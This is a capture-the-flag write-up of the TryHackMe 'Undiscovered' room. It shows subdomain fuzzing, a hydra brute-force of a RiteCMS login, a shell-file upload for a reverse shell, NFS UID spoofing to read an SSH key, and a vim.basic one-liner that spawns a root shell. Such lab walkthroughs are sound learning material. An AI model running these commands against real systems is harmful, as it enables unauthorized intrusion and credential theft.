---
title: "Undiscovered - TryHackMe"
date: "2021-02-13"
categories: 
  - "tryhackme"
tags: 
  - "hydra"
  - "sub-domain"
  - "web"
coverImage: "Undiscover.jpeg"
---

Write-up for Tryhackme room [Undiscovered](https://tryhackme.com/room/undiscoveredup).

Difficulty Level - Medium

Start with nmap scan as usual.

```
nmap -A -oN initial $IP
```

![](/Images/undiscovered/Screenshot-2021-02-13-204154.png)

after that i tried directory brute-force with gobuster but no luck, since we add the domain name to our "**/etc/hosts**" maybe its something to do with sub-domains.

using "**wfuzz**" we can brute-force subdomain

```
wfuzz -c -f sub-lists.txt -w /opt/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://undiscovered.thm' -H "Host: FUZZ.undiscovered.thm" --hc --hw 290
```

![](/Images/undiscovered/Screenshot-2021-02-13-210842.png)

now we need to add those sub domain to "**/etc/hosts**" to access.

![](/Images/undiscovered/Screenshot-2021-02-13-211527.png)

when we go to manager.undiscovered.thm we can see CMS type and version, with those details we can search for exploit available in [Exploit Database](https://www.exploit-db.com/)

i found these 2 vulnerable exploits.

1. [RiteCMS 2.2.1 - Remote Code Execution (Authenticated)](https://www.exploit-db.com/exploits/48915)
2. [RiteCMS 2.2.1 - Authenticated Remote Code Execution](https://www.exploit-db.com/exploits/48636)

according to exploit database if we able to access "**http://website/CMS**" we can find login panel with luck using default credential we can login.

so to do that i wrote bash script,

```
#!/bin/bash

cat sub-lists.txt | while read line; do 
        curl "http://$line.undiscovered.thm/cms"
done

```

![](/Images/undiscovered/Screenshot-2021-02-13-212938.png)

we found the correct URL but unfortunately default password will not work so need to brute-force with hydra.

```
hydra -l admin -P /opt/rockyou.txt -f deliver.undiscovered.thm http-post-form "/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong"
```

![](/Images/undiscovered/Screenshot-2021-02-13-21-35-37-1024x199.png)

we found the password now we can login and find a way to upload shell file and get reverse shell.

```
Administration => File Manager => Upload file
```

![](/Images/undiscovered/Screenshot-2021-02-13-214322.png)

clicking file will execute the file and we get the reverse shell.

![](/Images/undiscovered/Screenshot-2021-02-13-214518-1024x148.png)

we can enumerate with linpeas.sh we can see this detail.

![](/Images/undiscovered/Screenshot-2021-02-13-215711.png)

if we create william user in our PC using same id we could mount the home with VM

```
sudo adduser -u 3003 william
```

![](/Images/undiscovered/Screenshot-2021-02-13-220214.png)

to mount the folder

```
sudo mount -t nfs undiscovered.thm:/home/william/ /home/william/
```

![](/Images/undiscovered/Screenshot-2021-02-13-221239.png)

first change william home folder executable by all.

```
chmod 777 /home/william
```

the "script" binary is SUID when we execute it read "**admin.sh**" when we analyze it we can notice we can give a parameter(file to read) since it belong to leonard we can try to read leonard ssh key.

![](/Images/undiscovered/Screenshot-2021-02-13-223333.png)

now login as user leonard

```
ssh -i id_rsa leonard@$IP
```

## Privilege Escalation

again run the linpeas get more details as user leonard

![](/Images/undiscovered/Screenshot-2021-02-13-223926.png)

"vim.basic" look suspicious so i went to checked the [GTFOBINS](https://gtfobins.github.io/gtfobins/vim/#capabilities), with suggested method we can escalate.

```
/usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

![](/Images/undiscovered/Screenshot-2021-02-13-224411.png)

Finally Root!!

Hack the planet, spread the knowledge!!
